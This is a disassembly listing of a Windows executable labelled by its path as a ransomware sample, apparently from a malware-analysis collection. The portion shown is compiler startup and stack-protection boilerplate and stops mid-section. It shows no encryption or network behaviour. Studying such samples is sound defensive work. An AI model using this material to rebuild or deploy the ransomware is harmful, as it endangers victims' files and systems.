
malware_samples/ransomware/4fbbf0d94f1140ffde0bdd48c5b07f91f2292fae78b227e48a50b60ed624763b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	cc                   	int3
   140001001:	cc                   	int3
   140001002:	cc                   	int3
   140001003:	cc                   	int3
   140001004:	cc                   	int3
   140001005:	cc                   	int3
   140001006:	cc                   	int3
   140001007:	cc                   	int3
   140001008:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000100d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001012:	57                   	push   %rdi
   140001013:	48 83 ec 50          	sub    $0x50,%rsp
   140001017:	48 8b 05 62 d0 00 00 	mov    0xd062(%rip),%rax        # 0x14000e080
   14000101e:	48 33 c4             	xor    %rsp,%rax
   140001021:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001026:	48 83 3d f2 cf 00 00 	cmpq   $0x0,0xcff2(%rip)        # 0x14000e020
   14000102d:	00 
   14000102e:	48 8b 05 d3 cf 00 00 	mov    0xcfd3(%rip),%rax        # 0x14000e008
   140001035:	0f 10 40 f0          	movups -0x10(%rax),%xmm0
   140001039:	f3 0f 7f 44 24 38    	movdqu %xmm0,0x38(%rsp)
   14000103f:	74 07                	je     0x140001048
   140001041:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001046:	cd 29                	int    $0x29
   140001048:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000104b:	4c 8d 0d ce cf 00 00 	lea    0xcfce(%rip),%r9        # 0x14000e020
   140001052:	4c 8d 05 a7 cf 00 00 	lea    0xcfa7(%rip),%r8        # 0x14000e000
   140001059:	48 8d 15 f0 00 00 00 	lea    0xf0(%rip),%rdx        # 0x140001150
   140001060:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001065:	f3 0f 7f 05 bb cf 00 	movdqu %xmm0,0xcfbb(%rip)        # 0x14000e028
   14000106c:	00 
   14000106d:	48 ff 15 fc a1 00 00 	rex.W call *0xa1fc(%rip)        # 0x14000b270
   140001074:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001079:	8b d8                	mov    %eax,%ebx
   14000107b:	85 c0                	test   %eax,%eax
   14000107d:	74 14                	je     0x140001093
   14000107f:	0f 8e 9f 00 00 00    	jle    0x140001124
   140001085:	0f b7 d8             	movzwl %ax,%ebx
   140001088:	81 cb 00 00 07 80    	or     $0x80070000,%ebx
   14000108e:	e9 91 00 00 00       	jmp    0x140001124
   140001093:	48 8b 3d 6e cf 00 00 	mov    0xcf6e(%rip),%rdi        # 0x14000e008
   14000109a:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000109f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400010a5:	48 8d 15 a4 a8 00 00 	lea    0xa8a4(%rip),%rdx        # 0x14000b950
   1400010ac:	33 c9                	xor    %ecx,%ecx
   1400010ae:	0f b7 37             	movzwl (%rdi),%esi
   1400010b1:	48 ff 15 f8 a2 00 00 	rex.W call *0xa2f8(%rip)        # 0x14000b3b0
   1400010b8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400010bd:	85 c0                	test   %eax,%eax
   1400010bf:	75 1e                	jne    0x1400010df
   1400010c1:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400010c6:	33 c9                	xor    %ecx,%ecx
   1400010c8:	48 8d 15 d1 a8 00 00 	lea    0xa8d1(%rip),%rdx        # 0x14000b9a0
   1400010cf:	48 ff 15 da a2 00 00 	rex.W call *0xa2da(%rip)        # 0x14000b3b0
   1400010d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400010db:	85 c0                	test   %eax,%eax
   1400010dd:	74 45                	je     0x140001124
   1400010df:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400010e4:	48 8d 15 d5 a8 00 00 	lea    0xa8d5(%rip),%rdx        # 0x14000b9c0
   1400010eb:	48 ff 15 56 a2 00 00 	rex.W call *0xa256(%rip)        # 0x14000b348
   1400010f2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400010f7:	48 85 c0             	test   %rax,%rax
   1400010fa:	74 17                	je     0x140001113
   1400010fc:	48 8b 0d 1d cf 00 00 	mov    0xcf1d(%rip),%rcx        # 0x14000e020
   140001103:	44 8b ce             	mov    %esi,%r9d
   140001106:	4c 8b c7             	mov    %rdi,%r8
   140001109:	ba 02 00 00 00       	mov    $0x2,%edx
   14000110e:	e8 fd 8e 00 00       	call   0x14000a010
   140001113:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001118:	48 ff 15 49 a2 00 00 	rex.W call *0xa249(%rip)        # 0x14000b368
   14000111f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001124:	8b c3                	mov    %ebx,%eax
   140001126:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000112b:	48 33 cc             	xor    %rsp,%rcx
   14000112e:	e8 7d 8a 00 00       	call   0x140009bb0
   140001133:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140001138:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000113d:	48 83 c4 50          	add    $0x50,%rsp
   140001141:	5f                   	pop    %rdi
   140001142:	c3                   	ret
   140001143:	cc                   	int3
   140001144:	cc                   	int3
   140001145:	cc                   	int3
   140001146:	cc                   	int3
   140001147:	cc                   	int3
   140001148:	cc                   	int3
   140001149:	cc                   	int3
   14000114a:	cc                   	int3
   14000114b:	cc                   	int3
   14000114c:	cc                   	int3
   14000114d:	cc                   	int3
   14000114e:	cc                   	int3
   14000114f:	cc                   	int3
   140001150:	48 83 ec 48          	sub    $0x48,%rsp
   140001154:	4c 8b d9             	mov    %rcx,%r11
   140001157:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000115e:	00 
   14000115f:	48 85 c9             	test   %rcx,%rcx
   140001162:	74 5a                	je     0x1400011be
   140001164:	4c 8b 54 24 70       	mov    0x70(%rsp),%r10
   140001169:	8b c2                	mov    %edx,%eax
   14000116b:	85 d2                	test   %edx,%edx
   14000116d:	74 23                	je     0x140001192
   14000116f:	83 f8 01             	cmp    $0x1,%eax
   140001172:	75 21                	jne    0x140001195
   140001174:	45 84 c0             	test   %r8b,%r8b
   140001177:	74 08                	je     0x140001181
   140001179:	41 0f b6 c0          	movzbl %r8b,%eax
   14000117d:	ff c0                	inc    %eax
   14000117f:	eb 05                	jmp    0x140001186
   140001181:	b8 00 01 00 00       	mov    $0x100,%eax
   140001186:	89 01                	mov    %eax,(%rcx)
   140001188:	4c 89 49 10          	mov    %r9,0x10(%rcx)
   14000118c:	4c 89 51 18          	mov    %r10,0x18(%rcx)
   140001190:	eb 03                	jmp    0x140001195
   140001192:	83 21 00             	andl   $0x0,(%rcx)
   140001195:	48 8b 41 28          	mov    0x28(%rcx),%rax
   140001199:	48 85 c0             	test   %rax,%rax
   14000119c:	74 20                	je     0x1400011be
   14000119e:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   1400011a2:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400011a7:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   1400011ac:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400011b1:	49 8b cb             	mov    %r11,%rcx
   1400011b4:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   1400011b9:	e8 52 8e 00 00       	call   0x14000a010
   1400011be:	48 83 c4 48          	add    $0x48,%rsp
   1400011c2:	c3                   	ret
   1400011c3:	cc                   	int3
   1400011c4:	cc                   	int3
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400011d4:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400011d9:	66 39 05 20 ee ff ff 	cmp    %ax,-0x11e0(%rip)        # 0x140000000
   1400011e0:	74 04                	je     0x1400011e6
   1400011e2:	33 c0                	xor    %eax,%eax
   1400011e4:	eb 53                	jmp    0x140001239
   1400011e6:	48 63 0d 4f ee ff ff 	movslq -0x11b1(%rip),%rcx        # 0x14000003c
   1400011ed:	48 8d 05 0c ee ff ff 	lea    -0x11f4(%rip),%rax        # 0x140000000
   1400011f4:	48 03 c8             	add    %rax,%rcx
   1400011f7:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400011fd:	75 e3                	jne    0x1400011e2
   1400011ff:	b8 0b 01 00 00       	mov    $0x10b,%eax
   140001204:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001208:	74 1e                	je     0x140001228
   14000120a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000120f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001213:	75 cd                	jne    0x1400011e2
   140001215:	33 c0                	xor    %eax,%eax
   140001217:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   14000121e:	76 19                	jbe    0x140001239
   140001220:	39 81 f8 00 00 00    	cmp    %eax,0xf8(%rcx)
   140001226:	eb 0e                	jmp    0x140001236
   140001228:	33 c0                	xor    %eax,%eax
   14000122a:	83 79 74 0e          	cmpl   $0xe,0x74(%rcx)
   14000122e:	76 09                	jbe    0x140001239
   140001230:	39 81 e8 00 00 00    	cmp    %eax,0xe8(%rcx)
   140001236:	0f 95 c0             	setne  %al
   140001239:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000123e:	89 05 9c d0 00 00    	mov    %eax,0xd09c(%rip)        # 0x14000e2e0
   140001244:	e8 0f 07 00 00       	call   0x140001958
   140001249:	8b c8                	mov    %eax,%ecx
   14000124b:	ff 15 af a4 00 00    	call   *0xa4af(%rip)        # 0x14000b700
   140001251:	48 8b 0d 48 a4 00 00 	mov    0xa448(%rip),%rcx        # 0x14000b6a0
   140001258:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000125c:	48 89 05 45 da 00 00 	mov    %rax,0xda45(%rip)        # 0x14000eca8
   140001263:	48 89 05 46 da 00 00 	mov    %rax,0xda46(%rip)        # 0x14000ecb0
   14000126a:	8b 05 fc d5 00 00    	mov    0xd5fc(%rip),%eax        # 0x14000e86c
   140001270:	89 01                	mov    %eax,(%rcx)
   140001272:	48 8b 0d 2f a4 00 00 	mov    0xa42f(%rip),%rcx        # 0x14000b6a8
   140001279:	8b 05 e1 d5 00 00    	mov    0xd5e1(%rip),%eax        # 0x14000e860
   14000127f:	89 01                	mov    %eax,(%rcx)
   140001281:	e8 2a 07 00 00       	call   0x1400019b0
   140001286:	83 3d b3 cd 00 00 00 	cmpl   $0x0,0xcdb3(%rip)        # 0x14000e040
   14000128d:	75 0d                	jne    0x14000129c
   14000128f:	48 8d 0d 1a 07 00 00 	lea    0x71a(%rip),%rcx        # 0x1400019b0
   140001296:	ff 15 3c a4 00 00    	call   *0xa43c(%rip)        # 0x14000b6d8
   14000129c:	33 c0                	xor    %eax,%eax
   14000129e:	48 83 c4 28          	add    $0x28,%rsp
   1400012a2:	c3                   	ret
   1400012a3:	cc                   	int3
   1400012a4:	cc                   	int3
   1400012a5:	cc                   	int3
   1400012a6:	cc                   	int3
   1400012a7:	cc                   	int3
   1400012a8:	cc                   	int3
   1400012a9:	cc                   	int3
   1400012aa:	cc                   	int3
   1400012ab:	cc                   	int3
   1400012ac:	cc                   	int3
   1400012ad:	cc                   	int3
   1400012ae:	cc                   	int3
   1400012af:	cc                   	int3
   1400012b0:	48 83 ec 38          	sub    $0x38,%rsp
   1400012b4:	8b 05 ae d5 00 00    	mov    0xd5ae(%rip),%eax        # 0x14000e868
   1400012ba:	4c 8d 05 17 d0 00 00 	lea    0xd017(%rip),%r8        # 0x14000e2d8
   1400012c1:	44 8b 0d 9c d5 00 00 	mov    0xd59c(%rip),%r9d        # 0x14000e864
   1400012c8:	48 8d 15 01 d0 00 00 	lea    0xd001(%rip),%rdx        # 0x14000e2d0
   1400012cf:	89 05 0f d0 00 00    	mov    %eax,0xd00f(%rip)        # 0x14000e2e4
   1400012d5:	48 8d 0d ec cf 00 00 	lea    0xcfec(%rip),%rcx        # 0x14000e2c8
   1400012dc:	48 8d 05 01 d0 00 00 	lea    0xd001(%rip),%rax        # 0x14000e2e4
   1400012e3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400012e8:	ff 15 1a a4 00 00    	call   *0xa41a(%rip)        # 0x14000b708
   1400012ee:	89 05 d8 cf 00 00    	mov    %eax,0xcfd8(%rip)        # 0x14000e2cc
   1400012f4:	48 83 c4 38          	add    $0x38,%rsp
   1400012f8:	c3                   	ret
   1400012f9:	cc                   	int3
   1400012fa:	cc                   	int3
   1400012fb:	cc                   	int3
   1400012fc:	cc                   	int3
   1400012fd:	cc                   	int3
   1400012fe:	cc                   	int3
   1400012ff:	cc                   	int3
   140001300:	48 83 ec 28          	sub    $0x28,%rsp
   140001304:	e8 9b 07 00 00       	call   0x140001aa4
   140001309:	48 83 c4 28          	add    $0x28,%rsp
   14000130d:	e9 06 00 00 00       	jmp    0x140001318
   140001312:	cc                   	int3
   140001313:	cc                   	int3
   140001314:	cc                   	int3
   140001315:	cc                   	int3
   140001316:	cc                   	int3
   140001317:	cc                   	int3
   140001318:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000131d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140001322:	41 56                	push   %r14
   140001324:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   14000132b:	33 c0                	xor    %eax,%eax
   14000132d:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140001331:	33 d2                	xor    %edx,%edx
   140001333:	44 8d 40 64          	lea    0x64(%rax),%r8d
   140001337:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000133c:	e8 65 08 00 00       	call   0x140001ba6
   140001341:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   140001346:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000134b:	ff 15 e7 a1 00 00    	call   *0xa1e7(%rip)        # 0x14000b538
   140001351:	90                   	nop
   140001352:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001359:	00 00 
   14000135b:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000135f:	33 ff                	xor    %edi,%edi
   140001361:	33 c0                	xor    %eax,%eax
   140001363:	f0 48 0f b1 1d 4c d9 	lock cmpxchg %rbx,0xd94c(%rip)        # 0x14000ecb8
   14000136a:	00 00 
   14000136c:	74 0a                	je     0x140001378
   14000136e:	48 3b c3             	cmp    %rbx,%rax
   140001371:	75 1a                	jne    0x14000138d
   140001373:	bf 01 00 00 00       	mov    $0x1,%edi
   140001378:	8b 05 42 d9 00 00    	mov    0xd942(%rip),%eax        # 0x14000ecc0
   14000137e:	83 f8 01             	cmp    $0x1,%eax
   140001381:	75 17                	jne    0x14000139a
   140001383:	8d 48 1e             	lea    0x1e(%rax),%ecx
   140001386:	e8 19 06 00 00       	call   0x1400019a4
   14000138b:	eb 76                	jmp    0x140001403
   14000138d:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   140001392:	ff 15 a8 a1 00 00    	call   *0xa1a8(%rip)        # 0x14000b540
   140001398:	eb c7                	jmp    0x140001361
   14000139a:	8b 05 20 d9 00 00    	mov    0xd920(%rip),%eax        # 0x14000ecc0
   1400013a0:	85 c0                	test   %eax,%eax
   1400013a2:	75 55                	jne    0x1400013f9
   1400013a4:	c7 05 12 d9 00 00 01 	movl   $0x1,0xd912(%rip)        # 0x14000ecc0
   1400013ab:	00 00 00 
   1400013ae:	4c 8d 35 eb a3 00 00 	lea    0xa3eb(%rip),%r14        # 0x14000b7a0
   1400013b5:	48 8d 1d cc a3 00 00 	lea    0xa3cc(%rip),%rbx        # 0x14000b788
   1400013bc:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400013c1:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1400013c5:	49 3b de             	cmp    %r14,%rbx
   1400013c8:	73 21                	jae    0x1400013eb
   1400013ca:	85 c0                	test   %eax,%eax
   1400013cc:	75 21                	jne    0x1400013ef
   1400013ce:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   1400013d2:	74 0c                	je     0x1400013e0
   1400013d4:	48 8b 03             	mov    (%rbx),%rax
   1400013d7:	e8 34 8c 00 00       	call   0x14000a010
   1400013dc:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1400013e0:	48 83 c3 08          	add    $0x8,%rbx
   1400013e4:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400013e9:	eb da                	jmp    0x1400013c5
   1400013eb:	85 c0                	test   %eax,%eax
   1400013ed:	74 14                	je     0x140001403
   1400013ef:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400013f4:	e9 58 01 00 00       	jmp    0x140001551
   1400013f9:	c7 05 c1 ce 00 00 01 	movl   $0x1,0xcec1(%rip)        # 0x14000e2c4
   140001400:	00 00 00 
   140001403:	8b 05 b7 d8 00 00    	mov    0xd8b7(%rip),%eax        # 0x14000ecc0
   140001409:	83 f8 01             	cmp    $0x1,%eax
   14000140c:	75 1d                	jne    0x14000142b
   14000140e:	48 8d 15 6b a3 00 00 	lea    0xa36b(%rip),%rdx        # 0x14000b780
   140001415:	48 8d 0d 54 a3 00 00 	lea    0xa354(%rip),%rcx        # 0x14000b770
   14000141c:	e8 62 07 00 00       	call   0x140001b83
   140001421:	c7 05 95 d8 00 00 02 	movl   $0x2,0xd895(%rip)        # 0x14000ecc0
   140001428:	00 00 00 
   14000142b:	85 ff                	test   %edi,%edi
   14000142d:	75 09                	jne    0x140001438
   14000142f:	33 c0                	xor    %eax,%eax
   140001431:	48 87 05 80 d8 00 00 	xchg   %rax,0xd880(%rip)        # 0x14000ecb8
   140001438:	48 83 3d 88 d8 00 00 	cmpq   $0x0,0xd888(%rip)        # 0x14000ecc8
   14000143f:	00 
   140001440:	74 25                	je     0x140001467
   140001442:	48 8d 0d 7f d8 00 00 	lea    0xd87f(%rip),%rcx        # 0x14000ecc8
   140001449:	e8 c2 05 00 00       	call   0x140001a10
   14000144e:	85 c0                	test   %eax,%eax
   140001450:	74 15                	je     0x140001467
   140001452:	45 33 c0             	xor    %r8d,%r8d
   140001455:	41 8d 50 02          	lea    0x2(%r8),%edx
   140001459:	33 c9                	xor    %ecx,%ecx
   14000145b:	48 8b 05 66 d8 00 00 	mov    0xd866(%rip),%rax        # 0x14000ecc8
   140001462:	e8 a9 8b 00 00       	call   0x14000a010
   140001467:	48 8b 05 4a a2 00 00 	mov    0xa24a(%rip),%rax        # 0x14000b6b8
   14000146e:	48 8b 18             	mov    (%rax),%rbx
   140001471:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140001476:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   14000147a:	0f b6 0b             	movzbl (%rbx),%ecx
   14000147d:	80 f9 20             	cmp    $0x20,%cl
   140001480:	77 71                	ja     0x1400014f3
   140001482:	84 c9                	test   %cl,%cl
   140001484:	74 04                	je     0x14000148a
   140001486:	85 ff                	test   %edi,%edi
   140001488:	75 69                	jne    0x1400014f3
   14000148a:	fe c9                	dec    %cl
   14000148c:	80 f9 1f             	cmp    $0x1f,%cl
   14000148f:	77 0c                	ja     0x14000149d
   140001491:	48 ff c3             	inc    %rbx
   140001494:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140001499:	8a 0b                	mov    (%rbx),%cl
   14000149b:	eb ed                	jmp    0x14000148a
   14000149d:	f6 44 24 7c 01       	testb  $0x1,0x7c(%rsp)
   1400014a2:	0f b7 84 24 80 00 00 	movzwl 0x80(%rsp),%eax
   1400014a9:	00 
   1400014aa:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   1400014b0:	44 0f 45 c8          	cmovne %eax,%r9d
   1400014b4:	4c 8b c3             	mov    %rbx,%r8
   1400014b7:	33 d2                	xor    %edx,%edx
   1400014b9:	48 8d 0d 40 eb ff ff 	lea    -0x14c0(%rip),%rcx        # 0x140000000
   1400014c0:	e8 e7 6d 00 00       	call   0x1400082ac
   1400014c5:	89 05 f5 cd 00 00    	mov    %eax,0xcdf5(%rip)        # 0x14000e2c0
   1400014cb:	83 3d 0e ce 00 00 00 	cmpl   $0x0,0xce0e(%rip)        # 0x14000e2e0
   1400014d2:	75 08                	jne    0x1400014dc
   1400014d4:	8b c8                	mov    %eax,%ecx
   1400014d6:	ff 15 1c a2 00 00    	call   *0xa21c(%rip)        # 0x14000b6f8
   1400014dc:	83 3d e1 cd 00 00 00 	cmpl   $0x0,0xcde1(%rip)        # 0x14000e2c4
   1400014e3:	75 0c                	jne    0x1400014f1
   1400014e5:	ff 15 fd a1 00 00    	call   *0xa1fd(%rip)        # 0x14000b6e8
   1400014eb:	8b 05 cf cd 00 00    	mov    0xcdcf(%rip),%eax        # 0x14000e2c0
   1400014f1:	eb 5e                	jmp    0x140001551
   1400014f3:	80 f9 22             	cmp    $0x22,%cl
   1400014f6:	75 0d                	jne    0x140001505
   1400014f8:	33 c0                	xor    %eax,%eax
   1400014fa:	85 ff                	test   %edi,%edi
   1400014fc:	0f 94 c0             	sete   %al
   1400014ff:	8b f8                	mov    %eax,%edi
   140001501:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140001505:	ff 15 d5 a1 00 00    	call   *0xa1d5(%rip)        # 0x14000b6e0
   14000150b:	85 c0                	test   %eax,%eax
   14000150d:	74 08                	je     0x140001517
   14000150f:	48 ff c3             	inc    %rbx
   140001512:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140001517:	48 ff c3             	inc    %rbx
   14000151a:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000151f:	e9 56 ff ff ff       	jmp    0x14000147a
   140001524:	89 05 96 cd 00 00    	mov    %eax,0xcd96(%rip)        # 0x14000e2c0
   14000152a:	83 3d af cd 00 00 00 	cmpl   $0x0,0xcdaf(%rip)        # 0x14000e2e0
   140001531:	75 09                	jne    0x14000153c
   140001533:	8b c8                	mov    %eax,%ecx
   140001535:	ff 15 b5 a1 00 00    	call   *0xa1b5(%rip)        # 0x14000b6f0
   14000153b:	cc                   	int3
   14000153c:	83 3d 81 cd 00 00 00 	cmpl   $0x0,0xcd81(%rip)        # 0x14000e2c4
   140001543:	75 0c                	jne    0x140001551
   140001545:	ff 15 9d a1 00 00    	call   *0xa19d(%rip)        # 0x14000b6e8
   14000154b:	8b 05 6f cd 00 00    	mov    0xcd6f(%rip),%eax        # 0x14000e2c0
   140001551:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   140001558:	00 
   140001559:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   14000155d:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   140001561:	49 8b e3             	mov    %r11,%rsp
   140001564:	41 5e                	pop    %r14
   140001566:	c3                   	ret
   140001567:	cc                   	int3
   140001568:	cc                   	int3
   140001569:	cc                   	int3
   14000156a:	cc                   	int3
   14000156b:	cc                   	int3
   14000156c:	cc                   	int3
   14000156d:	cc                   	int3
   14000156e:	cc                   	int3
   14000156f:	cc                   	int3
   140001570:	cc                   	int3
   140001571:	cc                   	int3
   140001572:	cc                   	int3
   140001573:	cc                   	int3
   140001574:	cc                   	int3
   140001575:	cc                   	int3
   140001576:	cc                   	int3
   140001577:	cc                   	int3
   140001578:	40 53                	rex push %rbx
   14000157a:	48 83 ec 20          	sub    $0x20,%rsp
   14000157e:	48 8b d9             	mov    %rcx,%rbx
   140001581:	33 c9                	xor    %ecx,%ecx
   140001583:	ff 15 87 9f 00 00    	call   *0x9f87(%rip)        # 0x14000b510
   140001589:	48 8b cb             	mov    %rbx,%rcx
   14000158c:	ff 15 86 9f 00 00    	call   *0x9f86(%rip)        # 0x14000b518
   140001592:	ff 15 c0 9f 00 00    	call   *0x9fc0(%rip)        # 0x14000b558
   140001598:	48 8b c8             	mov    %rax,%rcx
   14000159b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   1400015a0:	48 83 c4 20          	add    $0x20,%rsp
   1400015a4:	5b                   	pop    %rbx
   1400015a5:	48 ff 25 5c 9f 00 00 	rex.W jmp *0x9f5c(%rip)        # 0x14000b508
   1400015ac:	cc                   	int3
   1400015ad:	cc                   	int3
   1400015ae:	cc                   	int3
   1400015af:	cc                   	int3
   1400015b0:	cc                   	int3
   1400015b1:	cc                   	int3
   1400015b2:	cc                   	int3
   1400015b3:	cc                   	int3
   1400015b4:	cc                   	int3
   1400015b5:	cc                   	int3
   1400015b6:	cc                   	int3
   1400015b7:	cc                   	int3
   1400015b8:	cc                   	int3
   1400015b9:	cc                   	int3
   1400015ba:	cc                   	int3
   1400015bb:	cc                   	int3
   1400015bc:	cc                   	int3
   1400015bd:	cc                   	int3
   1400015be:	cc                   	int3
   1400015bf:	cc                   	int3
   1400015c0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400015c5:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400015cc:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400015d3:	00 00 
   1400015d5:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   1400015dc:	00 00 
   1400015de:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   1400015e5:	00 00 
   1400015e7:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400015ee:	00 00 
   1400015f0:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
   1400015f7:	00 00 
   1400015f9:	48 8d 0d 90 cd 00 00 	lea    0xcd90(%rip),%rcx        # 0x14000e390
   140001600:	ff 15 2a 9f 00 00    	call   *0x9f2a(%rip)        # 0x14000b530
   140001606:	48 8b 05 7b ce 00 00 	mov    0xce7b(%rip),%rax        # 0x14000e488
   14000160d:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001612:	45 33 c0             	xor    %r8d,%r8d
   140001615:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000161a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000161f:	ff 15 03 9f 00 00    	call   *0x9f03(%rip)        # 0x14000b528
   140001625:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000162a:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   140001630:	74 42                	je     0x140001674
   140001632:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140001639:	00 00 
   14000163b:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140001640:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001645:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000164a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000164f:	48 8d 05 3a cd 00 00 	lea    0xcd3a(%rip),%rax        # 0x14000e390
   140001656:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000165b:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140001660:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140001665:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   14000166a:	33 c9                	xor    %ecx,%ecx
   14000166c:	ff 15 ae 9e 00 00    	call   *0x9eae(%rip)        # 0x14000b520
   140001672:	eb 23                	jmp    0x140001697
   140001674:	48 8b 05 ad cd 00 00 	mov    0xcdad(%rip),%rax        # 0x14000e428
   14000167b:	48 8b 00             	mov    (%rax),%rax
   14000167e:	48 89 05 03 ce 00 00 	mov    %rax,0xce03(%rip)        # 0x14000e488
   140001685:	48 8b 05 9c cd 00 00 	mov    0xcd9c(%rip),%rax        # 0x14000e428
   14000168c:	48 83 c0 08          	add    $0x8,%rax
   140001690:	48 89 05 91 cd 00 00 	mov    %rax,0xcd91(%rip)        # 0x14000e428
   140001697:	48 8b 05 ea cd 00 00 	mov    0xcdea(%rip),%rax        # 0x14000e488
   14000169e:	48 89 05 5b cc 00 00 	mov    %rax,0xcc5b(%rip)        # 0x14000e300
   1400016a5:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   1400016ac:	00 
   1400016ad:	48 89 05 5c cd 00 00 	mov    %rax,0xcd5c(%rip)        # 0x14000e410
   1400016b4:	c7 05 32 cc 00 00 09 	movl   $0xc0000409,0xcc32(%rip)        # 0x14000e2f0
   1400016bb:	04 00 c0 
   1400016be:	c7 05 2c cc 00 00 01 	movl   $0x1,0xcc2c(%rip)        # 0x14000e2f4
   1400016c5:	00 00 00 
   1400016c8:	c7 05 36 cc 00 00 03 	movl   $0x3,0xcc36(%rip)        # 0x14000e308
   1400016cf:	00 00 00 
   1400016d2:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016d7:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400016db:	48 8d 0d 2e cc 00 00 	lea    0xcc2e(%rip),%rcx        # 0x14000e310
   1400016e2:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400016e9:	00 
   1400016ea:	b8 08 00 00 00       	mov    $0x8,%eax
   1400016ef:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400016f3:	48 8d 0d 16 cc 00 00 	lea    0xcc16(%rip),%rcx        # 0x14000e310
   1400016fa:	48 8b 15 7f c9 00 00 	mov    0xc97f(%rip),%rdx        # 0x14000e080
   140001701:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   140001705:	b8 08 00 00 00       	mov    $0x8,%eax
